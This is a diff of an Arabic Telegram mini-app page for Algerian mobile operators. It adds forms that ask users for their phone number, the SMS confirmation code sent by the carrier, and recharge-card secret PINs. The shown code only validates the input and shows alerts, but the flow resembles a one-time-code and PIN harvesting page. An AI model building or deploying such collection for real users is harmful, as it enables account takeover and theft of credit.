@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>خدمات الاتصالات وتحويل الرصيد</title>
+  <title>خدمات الاتصالات وتعبئة الرصيد</title>
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root {
@@ -88,7 +88,7 @@
       font-size: 11px;
     }
 
-    /* بطاقة الرصيد */
+    /* بطاقة الرصيد (تبقى 0.00 إلى حين الربط الحقيقي) */
     .balance-card {
       background: linear-gradient(135deg, #1e293b, #0f172a);
       border: 1px solid #334155;
@@ -133,7 +133,7 @@
       margin-top: 2px;
     }
 
-    /* العروض */
+    /* قسم العروض */
     .offers-section {
       background: var(--card-bg);
       border-radius: 14px;
@@ -179,7 +179,7 @@
       cursor: pointer;
     }
 
-    /* قسم الإدخال */
+    /* قسم الإدخال التفاعلي */
     .login-section {
       background: var(--card-bg);
       border-radius: 14px;
@@ -228,13 +228,24 @@
       background: #eab308;
       color: #000;
     }
+
+    .btn-link {
+      background: none;
+      border: none;
+      color: #94a3b8;
+      font-size: 11px;
+      margin-top: 8px;
+      cursor: pointer;
+      width: 100%;
+      text-decoration: underline;
+    }
   </style>
 </head>
 <body>
 
   <div class="header">
-    <h1>📱 خدمات الاتصالات وتحويل الرصيد</h1>
-    <p>اختر المتعامل لعرض رصيدك وتحويل الخدمات</p>
+    <h1>📱 خدمات الاتصالات وتعبئة الرصيد</h1>
+    <p>اختر المتعامل لعرض رصيدك وتعبئة اشتراكك</p>
   </div>
 
   <!-- المتعاملين -->
@@ -253,19 +264,19 @@
     </div>
     <div class="op-card" id="card-algerie" onclick="switchOp('algerie')">
       <div class="op-badge badge-algerie">AT</div>
-      <h4>إيدوم</h4>
+      <h4>إيدوم 4G</h4>
     </div>
   </div>
 
-  <!-- بطاقة الرصيد (صفر دائماً ما لم يتم الربط الحقيقي) -->
+  <!-- بطاقة الرصيد (تبقى 0.00 طالما لم نربط الحساب بسيرفر) -->
   <div class="balance-card">
     <div class="balance-box">
-      <div class="balance-title">💰 رصيد الحساب (فليكسي)</div>
+      <div class="balance-title" id="title1">💰 رصيد الحساب</div>
       <div class="balance-value" id="creditVal">0.00 دج</div>
       <span class="status-tag" id="statusTag1">(غير مربوط)</span>
     </div>
     <div class="balance-box">
-      <div class="balance-title">🌐 رصيد الإنترنت المتبقي</div>
+      <div class="balance-title" id="title2">🌐 رصيد الإنترنت</div>
       <div class="balance-value net" id="internetVal">0.00 Go</div>
       <span class="status-tag" id="statusTag2">(غير مربوط)</span>
     </div>
@@ -277,18 +288,17 @@
     <div id="offersList"></div>
   </div>
 
-  <!-- القسم التفاعلي لربط الرقم والرمز -->
+  <!-- القسم التفاعلي المتبدل بنفس الخانة -->
   <div class="login-section" id="actionSection"></div>
 
   <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // حالة إدخال الرقم لكل متعامل (0: ادخل الرقم, 1: ادخل الرمز)
+    // حالة إدخال الرقم لكل متعامل (0: ادخل الرقم, 1: ادخل الكود)
     let stepState = {
       djezzy: { step: 0, phone: '' },
-      ooredoo: { step: 0, phone: '' },
-      algerie: { step: 0, phone: '' }
+      ooredoo: { step: 0, phone: '' }
     };
 
     const offersData = {
@@ -313,9 +323,10 @@
         ]
       },
       algerie: {
-        title: "🔥 عروض وتعبئة إيدوم (اتصالات الجزائر):",
+        title: "🌐 تعبئة مودام إيدوم (Idoom 4G / ADSL):",
         offers: [
-          { name: "🎁 مكافأة التعبئة الإلكترونية", desc: "أيام إضافية مجانية عند الشحن أونلاين", action: "شحن" }
+          { name: "💳 بطاقات التعبئة", desc: "شحن اشتراك المودام باستخدام كارت التعبئة", action: "تعبئة" },
+          { name: "🎁 أيام مجانية", desc: "احصل على هدايا وأيام إضافية عند التعبئة قبل انتهاء الاشتراك", action: "تفاصيل" }
         ]
       }
     };
@@ -327,20 +338,31 @@
       document.querySelectorAll('.op-card').forEach(c => c.classList.remove('active'));
       document.getElementById(`card-${opKey}`).classList.add('active');
 
-      // الرصيد يبقى دائماً 0.00 طالما لم نربطه بعد بسيرفر حقيقي
+      // العناوين والرصيد
       if (opKey === 'flexy') {
-        document.getElementById('creditVal').innerText = "تحويل";
+        document.getElementById('title1').innerText = "💰 تحويل الرصيد";
+        document.getElementById('title2').innerText = "🌐 نوع الخدمة";
+        document.getElementById('creditVal').innerText = "فليكسي";
         document.getElementById('internetVal').innerText = "P2P";
         document.getElementById('statusTag1').innerText = "مباشر";
-        document.getElementById('statusTag2').innerText = "بين الأصدقاء";
+        document.getElementById('statusTag2').innerText = "بين المشتركين";
+      } else if (opKey === 'algerie') {
+        document.getElementById('title1').innerText = "📟 رقم المودام";
+        document.getElementById('title2').innerText = "⏳ أيام الاشتراك";
+        document.getElementById('creditVal').innerText = "غير محدد";
+        document.getElementById('internetVal').innerText = "0 يوم";
+        document.getElementById('statusTag1').innerText = "(أدخل رقم المودام)";
+        document.getElementById('statusTag2').innerText = "(غير مشحون)";
       } else {
+        document.getElementById('title1').innerText = "💰 رصيد الحساب";
+        document.getElementById('title2').innerText = "🌐 رصيد الإنترنت";
         document.getElementById('creditVal').innerText = "0.00 دج";
         document.getElementById('internetVal').innerText = "0.00 Go";
         document.getElementById('statusTag1').innerText = "(غير مربوط)";
         document.getElementById('statusTag2').innerText = "(غير مربوط)";
       }
 
-      // قائمة العروض
+      // عرض قائمة الهدايا والعروض
       const opOffers = offersData[opKey];
       document.getElementById('offersTitle').innerText = opOffers.title;
 
@@ -358,7 +380,7 @@
       });
       document.getElementById('offersList').innerHTML = listHtml;
 
-      // تحديث نموذج الإدخال حسب المرحلة
+      // تحديث خانة الإدخال السفلي
       renderActionSection();
     }
 
@@ -368,31 +390,44 @@
       if (currentOp === 'flexy') {
         actionSec.innerHTML = `
           <h3>💸 تحويل فليكسي إلى صديق</h3>
+          <p>أدخل رقم المستلم والمبلغ المراد تحويله</p>
           <input type="tel" id="friendPhone" class="input-field" placeholder="رقم هاتف الصديق (07/05/06)" />
-          <input type="number" id="flexyAmount" class="input-field" placeholder="المبلغ المراد تحويله (مثلاً 100 دج)" />
+          <input type="number" id="flexyAmount" class="input-field" placeholder="المبلغ بالدينار (مثلاً 100)" />
           <button class="btn-main btn-flexy" onclick="sendFlexy()">إرسال الرصيد الآن</button>
         `;
         return;
       }
 
+      if (currentOp === 'algerie') {
+        actionSec.innerHTML = `
+          <h3>💳 تعبئة مودام إيدوم بكارت الشحن</h3>
+          <p>أدخل رقم حساب المودام والرقم السري لكارت التعبئة</p>
+          <input type="number" id="modemNumber" class="input-field" placeholder="رقم المودام / خط إيدوم (10 أرقام)" />
+          <input type="number" id="cardRecharge" class="input-field" placeholder="الرقم السري لكارت التعبئة (16 رقم)" />
+          <button class="btn-main" onclick="rechargeModem()">تعبئة المودام الآن</button>
+        `;
+        return;
+      }
+
+      // جيزي أو أوريدو (تبديل الخانات بنفس المكان)
       const currentState = stepState[currentOp];
 
       if (currentState.step === 0) {
-        // المرحلة الأولى: إدخال رقم الهاتف
+        // المرحلة الأولى: إدخال الرقم
         actionSec.innerHTML = `
           <h3>📲 أدخل رقم الهاتف لمعرفة رصيدك</h3>
-          <p>أدخل رقمك ليتم إرسال رمز التأكيد ورؤية رصيدك الحقيقي</p>
+          <p>أدخل رقمك ليتم إرسال رمز التأكيد ومعرفة رصيدك الحقيقي</p>
           <input type="tel" id="userPhone" class="input-field" placeholder="أدخل رقم الهاتف (07/05/06)" />
           <button class="btn-main" onclick="sendPhone()">إرسال وتأكيد الرقم</button>
         `;
       } else {
-        // المرحلة الثانية: إدخال الكود
+        // المرحلة الثانية: تتغير الخانة في نفس المكان لكتابة الكود
         actionSec.innerHTML = `
           <h3>📩 أدخل رمز التأكيد (SMS)</h3>
           <p>يرجى إرسال الكود الذي وصلك إلى رقم هاتفك (<b>${currentState.phone}</b>)</p>
           <input type="number" id="smsCode" class="input-field" placeholder="أدخل الكود هنا (مثلاً 1234)" />
           <button class="btn-main" onclick="verifyCode()">تأكيد وربط الحساب</button>
-          <button style="background:none; border:none; color:#94a3b8; font-size:11px; margin-top:8px; cursor:pointer; width:100%;" onclick="resetStep()">تغيير رقم الهاتف</button>
+          <button class="btn-link" onclick="resetStep()">تغيير رقم الهاتف</button>
         `;
       }
     }
@@ -411,10 +446,10 @@
     function verifyCode() {
       const codeInput = document.getElementById('smsCode').value;
       if (!codeInput || codeInput.length < 4) {
-        alert('يرجى إدخال الكود المستلم في الرسالة بشكل صحيح');
+        alert('يرجى إدخال كود SMS بشكل صحيح');
         return;
       }
-      alert("جاري الاتصال بالسيرفر والتحقق من الكود لقراءة الرصيد الحقيقي...");
+      alert("جاري التحقق من الكود لاتصالك بالسيرفر وقراءة الرصيد الحقيقي...");
     }
 
     function resetStep() {
@@ -422,8 +457,23 @@
       renderActionSection();
     }
 
+    function rechargeModem() {
+      const modemNum = document.getElementById('modemNumber').value;
+      const cardNum = document.getElementById('cardRecharge').value;
+
+      if (!modemNum || modemNum.length < 8) {
+        alert('يرجى إدخال رقم حساب المودام بشكل صحيح');
+        return;
+      }
+      if (!cardNum || cardNum.length < 10) {
+        alert('يرجى إدخال الرقم السري لكارت التعبئة المكون من 16 رقم');
+        return;
+      }
+      alert(`جاري شحن المودام رقم (${modemNum}) باستخدام الكارت...`);
+    }
+
     function selectOffer(offerName) {
-      alert(`يرجى إدخال رقم هاتفك وتأكيد الكود أولاً للتمكن من الاستفادة من: ${offerName}`);
+      alert(`يرجى إدخال رقم الهاتف وتأكيد الكود للاستفادة من: ${offerName}`);
     }
 
     function sendFlexy() {
@@ -431,7 +481,7 @@
       const amount = document.getElementById('flexyAmount').value;
 
       if (!friendPhone || friendPhone.length < 9) {
-        alert('يرجى إدخال رقم هاتف الصديق بشكل صحيح');
+        alert('يرجى إدخال رقم هاتف المستلم بشكل صحيح');
         return;
       }
       if (!amount || amount < 50) {
@@ -441,7 +491,7 @@
       alert(`جاري تحويل ${amount} دج إلى الرقم ${friendPhone}...`);
     }
 
-    // التحميل المبدئي
+    // التشغيل المبدئي عند الفتح
     switchOp('djezzy');
   </script>
 </body>
